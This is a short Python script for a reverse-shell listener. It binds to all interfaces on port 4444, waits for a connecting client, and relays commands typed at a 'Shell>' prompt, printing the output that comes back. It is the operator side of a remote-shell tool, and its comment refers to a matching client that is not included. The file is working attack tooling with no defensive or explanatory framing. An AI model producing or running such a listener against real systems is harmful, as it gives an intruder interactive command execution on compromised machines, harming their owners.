# A listener (server) that waits for incoming connections.

import socket

LISTENER_IP = "0.0.0.0"  # Listen on all interfaces
LISTENER_PORT = 4444     # Must match the client's port

def start_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LISTENER_IP, LISTENER_PORT))
    s.listen(1)

    print(f"[*] Listening on {LISTENER_IP}:{LISTENER_PORT}...")
    
    conn, addr = s.accept()
    print(f"[+] Connection established from {addr}")

    while True:
        command = input("Shell> ")
        conn.send(command.encode())  # Send command to the client

        if command.lower() == "exit":
            break
        
        response = conn.recv(4096).decode()  # Receive output
        print(response)

    conn.close()

start_listener()
